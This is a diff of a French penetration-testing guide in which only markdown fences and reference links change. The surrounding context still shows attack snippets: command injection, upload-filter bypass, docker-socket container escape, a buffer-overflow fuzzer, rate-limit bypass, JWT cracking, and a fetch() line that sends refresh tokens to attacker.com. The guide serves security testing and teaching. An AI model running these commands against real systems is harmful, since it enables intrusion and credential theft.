@@ -480,7 +480,7 @@ Tapez le numero de votre choix (1-19):
 
 #### Chapitre 2: Methodologie d'une Attaque
 
-```markdown
+````markdown
 ## Collecte d'Informations (Reconnaissance)
 
 ### Fingerprinting
@@ -509,7 +509,7 @@ nmap -sS -sV -p- target
 # Service detection
 nmap -sV --version-intensity 5 target
 ```
-```
+````
 
 #### Chapitre 4: Failles Physiques
 
@@ -560,7 +560,7 @@ nmap -sV --version-intensity 5 target
 
 #### Chapitre 6: Failles Web (CRITIQUE pour applications web)
 
-```markdown
+````markdown
 ## Attaques Web - OWASP Focus
 
 ### Outils
@@ -614,11 +614,11 @@ $(whoami)
 - Null byte: shell.php%00.jpg
 - Content-Type bypass
 - Magic bytes manipulation
-```
+````
 
 #### Chapitre 7: Failles Systemes
 
-```markdown
+````markdown
 ## Privilege Escalation
 
 ### Linux
@@ -660,11 +660,11 @@ docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine
 # Capabilities abuse
 capsh --print
 ```
-```
+````
 
 #### Chapitre 8: Failles Applicatives
 
-```markdown
+````markdown
 ## Buffer Overflow & Shellcodes
 
 ### Stack Overflow
@@ -695,7 +695,7 @@ while True:
     s.send(buffer.encode())
     buffer += "A" * 100
 ```
-```
+````
 
 ---
 
@@ -765,7 +765,7 @@ while True:
 
 ### WAF Bypass Avancés (2025)
 
-```markdown
+````markdown
 ## Contournement WAF Moderne
 
 ### JSON-Based SQL Injection
@@ -832,11 +832,11 @@ A
 GET /api/users HTTP/1.1
  Host: target.com
 ```
-```
+````
 
 ### API Security - BOLA/BFLA Testing (OWASP API 2023)
 
-```markdown
+````markdown
 ## Broken Object Level Authorization (BOLA/IDOR)
 
 ### Patterns de Détection
@@ -901,11 +901,11 @@ for i in {1..100}; do
   curl -H "X-Forwarded-For: 192.168.1.$i" http://target/api/login
 done
 ```
-```
+````
 
 ### Container Escape & Kubernetes Exploitation (2025)
 
-```markdown
+````markdown
 ## Docker Container Escape
 
 ### Vérification Environnement
@@ -1021,11 +1021,11 @@ kubectl get secrets -A
 # Pods avec privilèges
 kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
 ```
-```
+````
 
 ### Nouveaux Outils 2025
 
-```markdown
+````markdown
 ## Caido (Alternative Burp Suite)
 - **Type**: Proxy intercepteur Rust-based
 - **Avantage**: Léger, rapide, interface moderne
@@ -1061,7 +1061,7 @@ nuclei -u http://target -t custom/jwt-weak-secret.yaml
 | **subfinder** | Subdomain enum | `subfinder -d domain.com` |
 | **gau** | URLs historiques | `gau domain.com` |
 | **puredns** | DNS bruteforce | `puredns bruteforce wordlist.txt domain.com` |
-```
+````
 
 ### PayloadsAllTheThings - Cheatsheets 2025
 
@@ -1087,7 +1087,6 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
 | SecLists/Passwords | Spray attacks |
 | fuzzdb | Payloads injection |
 | assetnote-wordlists | API endpoints |
-```
 ```
 
 ---
@@ -1154,7 +1153,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ### JWT Attacks Avancés (2025)
 
-```markdown
+````markdown
 ## JWT Security Testing
 
 ### 1. Algorithm Confusion (alg:none)
@@ -1221,11 +1220,11 @@ jwt_tool $TOKEN -C -d wordlist.txt
 # jwt_tool génère un nouveau token
 jwt_tool $TOKEN -T -S hs256 -p "cracked_secret"
 ```
-```
+````
 
 ### Tests Refresh Token
 
-```markdown
+````markdown
 ## Refresh Token Attacks
 
 ### Token Reuse
@@ -1246,11 +1245,11 @@ fetch('http://attacker.com/steal?token='+localStorage.getItem('refresh_token'))
 /api/refresh?token=eyJhbGci...
 # → Logs serveur, historique navigateur, referrer header
 ```
-```
+````
 
 ### Tests Session Hijacking
 
-```markdown
+````markdown
 ## Session Security Tests
 
 ### Cookie Flags Verification
@@ -1277,7 +1276,7 @@ curl -I http://target/api/auth/login -d '...' | grep -i set-cookie
 2. Connexion depuis device B (même compte)
 3. Vérifier si session A est invalidée
 4. Vérifier limite sessions simultanées
-```
+````
 
 ### Tests Database (PostgreSQL)
 
@@ -1300,7 +1299,7 @@ SELECT * FROM pg_extension;
 
 ### Rapport Vulnerabilite Simple
 
-```markdown
+````markdown
 ## VULN-XXX: [Titre]
 
 **Severite**: CRITICAL / HIGH / MEDIUM / LOW / INFO
@@ -1334,13 +1333,13 @@ HTTP/1.1 200 OK
 [Correction recommandee avec code si applicable]
 
 ### References
-- [OWASP](url)
-- [CWE](url)
-```
+- [OWASP](https://owasp.org/)
+- [CWE](https://cwe.mitre.org/)
+````
 
 ### Rapport Pentest Complet
 
-```markdown
+````markdown
 # Rapport Pentest - [Cible]
 
 ## Executive Summary
@@ -1378,7 +1377,7 @@ INFO: V
 - Logs complets
 - Screenshots
 - Payloads utilises
-```
+````
 
 ---
 
